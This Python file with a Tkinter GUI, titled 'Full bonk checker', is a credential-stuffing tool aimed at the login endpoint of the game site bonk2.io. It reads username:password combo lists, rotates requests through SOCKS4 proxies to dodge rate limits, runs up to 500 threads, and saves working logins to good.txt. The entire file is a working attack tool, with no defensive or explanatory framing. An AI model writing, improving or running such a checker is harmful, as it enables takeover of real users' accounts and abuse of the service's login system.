from tkinter import *
import requests
import random
import threading
from threading import Thread
import time
tkwindow = Tk()
tkwindow.geometry("400x150")
good = 0
bad = 0
bad_text = Label(tkwindow,text="Bad: 0");bad_text.pack()
good_text = Label(tkwindow,text="Good: 0");good_text.pack()
tkwindow.title(f"Full bonk checker")
with open("accounts.txt","r",encoding="utf-8") as file:
    combolist = file.read().splitlines()
with open("proxies.txt") as file:
    proxies = file.read().splitlines()
url = "https://bonk2.io/scripts/login_legacy.php"
def check(combo):
    global good,bad
    acc = combo.split(":")
    username = acc[0]
    password = acc[1]
    data = {"username": username, "password": password}
    while True:
        proxy = random.choice(proxies)
        try:
            checker = requests.post(url,data=data,proxies={"https":f"socks4://{proxy}"},timeout=5)
            if "success" in checker.text:
                successlabel = Label(tkwindow, text=f"Valid  |  {combo}").pack()
                with open("good.txt","a") as file:
                    file.write(combo)
                    good+=1
                return
            elif "fail" in checker.text:
                with open("bad.txt","a") as file:
                    file.write(combo)
                    bad+=1
                return
        except:
            pass
def updater():
    while 1:
        try:
            good_text["text"] = "Good:",good
            bad_text["text"] = "Bad:",bad
        except:
            pass
        finally:
            time.sleep(0.1)
def checker1():
    for combo in combolist:
        while True:
            if threading.active_count() < 500 + 2:
                Thread(target=updater,daemon=True).start()
                threading.Thread(target=check, args=(combo, )).start()
                break
            else:
                time.sleep(0.5)
myButtton = Button(tkwindow, text="check", command=lambda:threading.Thread(target=checker1,daemon=True).start()).pack()
tkwindow.mainloop()





